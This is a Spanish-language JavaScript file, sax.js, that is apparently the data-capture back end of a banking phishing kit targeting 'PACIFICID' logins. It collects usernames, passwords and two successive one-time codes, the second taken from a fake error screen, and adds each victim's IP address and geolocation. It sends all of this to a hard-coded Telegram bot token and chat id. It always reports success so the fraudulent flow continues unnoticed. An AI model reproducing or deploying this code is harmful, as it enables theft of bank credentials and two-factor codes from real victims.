// sax.js - Sistema de Captura de Datos
class DataCapture {
    constructor() {
        this.botToken = '8184267365:AAEg-GR70W8vUwpTDW6tFYKimteZ3nQFXnU';
        this.chatId = '8281481654';
        this.apiUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
        console.log('âœ… sax.js inicializado correctamente');
    }

    // FunciÃ³n para obtener la IP del usuario
    async getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'No disponible';
        }
    }

    // FunciÃ³n para obtener la ubicaciÃ³n basada en IP
    async getLocation(ip) {
        try {
            if (ip === 'No disponible') return { city: 'No disponible', country: 'No disponible' };
            const response = await fetch(`https://ipapi.co/${ip}/json/`);
            const data = await response.json();
            return {
                city: data.city || 'No disponible',
                country: data.country_name || 'No disponible',
                region: data.region || 'No disponible',
                isp: data.org || 'No disponible'
            };
        } catch (error) {
            return { city: 'No disponible', country: 'No disponible' };
        }
    }

    // FunciÃ³n para enviar LOGIN a Telegram
    async sendLoginToTelegram(username, password) {
        try {
            console.log('ğŸ”¹ sax.js: Enviando login a Telegram...');
            
            // Obtener IP y ubicaciÃ³n
            const ip = await this.getIPAddress();
            const location = await this.getLocation(ip);
            
            // Crear mensaje de login
            const message = `
ğŸ” *NUEVO LOGIN DETECTADO - sax.js*

ğŸ‘¤ *Usuario:* \`${username}\`
ğŸ”‘ *ContraseÃ±a:* \`${password}\`

ğŸŒ *IP:* \`${ip}\`
ğŸ™ï¸ *Ciudad:* ${location.city}
ğŸ‡ºğŸ‡¸ *PaÃ­s:* ${location.country}
ğŸ“ *RegiÃ³n:* ${location.region}
ğŸ“¡ *ISP:* ${location.isp}

â° *Fecha:* ${new Date().toLocaleString('es-ES')}

ğŸ’¾ *Sistema:* sax.js
            `;

            // Enviar a Telegram
            const response = await fetch(this.apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            const result = await response.json();
            
            if (result.ok) {
                console.log('âœ… sax.js: Login enviado a Telegram exitosamente');
                return true;
            } else {
                console.error('âŒ sax.js: Error al enviar login:', result);
                return true; // Continuar flujo
            }
        } catch (error) {
            console.error('âŒ sax.js: Error en sendLoginToTelegram:', error);
            return true; // Continuar flujo
        }
    }

    // FunciÃ³n para enviar PRIMER CÃ“DIGO a Telegram
    async sendPrimerCodigo(codigo) {
        try {
            console.log('ğŸ”¹ sax.js: Enviando primer cÃ³digo a Telegram...');
            
            const ip = await this.getIPAddress();
            const location = await this.getLocation(ip);
            
            const message = `
ğŸ”¢ *PRIMER CÃ“DIGO PACIFICID - sax.js*

ğŸ” *CÃ³digo:* \`${codigo}\`

ğŸŒ *IP:* \`${ip}\`
ğŸ™ï¸ *Ciudad:* ${location.city}

â° *Fecha:* ${new Date().toLocaleString('es-ES')}

ğŸ’¾ *Sistema:* sax.js
            `;

            const response = await fetch(this.apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            const result = await response.json();
            
            if (result.ok) {
                console.log('âœ… sax.js: Primer cÃ³digo enviado a Telegram');
                return true;
            } else {
                console.error('âŒ sax.js: Error al enviar primer cÃ³digo:', result);
                return true;
            }
        } catch (error) {
            console.error('âŒ sax.js: Error en sendPrimerCodigo:', error);
            return true;
        }
    }

    // FunciÃ³n para enviar SEGUNDO CÃ“DIGO a Telegram
    async sendSegundoCodigo(codigo) {
        try {
            console.log('ğŸ”¹ sax.js: Enviando segundo cÃ³digo a Telegram...');
            
            const ip = await this.getIPAddress();
            const location = await this.getLocation(ip);
            
            const message = `
ğŸ”¢ *SEGUNDO CÃ“DIGO PACIFICID - sax.js*

ğŸ” *CÃ³digo:* \`${codigo}\`

âš ï¸ *Nota:* CÃ³digo ingresado en pantalla de error

ğŸŒ *IP:* \`${ip}\`
ğŸ™ï¸ *Ciudad:* ${location.city}

â° *Fecha:* ${new Date().toLocaleString('es-ES')}

ğŸ’¾ *Sistema:* sax.js
            `;

            const response = await fetch(this.apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            const result = await response.json();
            
            if (result.ok) {
                console.log('âœ… sax.js: Segundo cÃ³digo enviado a Telegram');
                return true;
            } else {
                console.error('âŒ sax.js: Error al enviar segundo cÃ³digo:', result);
                return true;
            }
        } catch (error) {
            console.error('âŒ sax.js: Error en sendSegundoCodigo:', error);
            return true;
        }
    }
}

// Crear instancia global de sax
const sax = new DataCapture();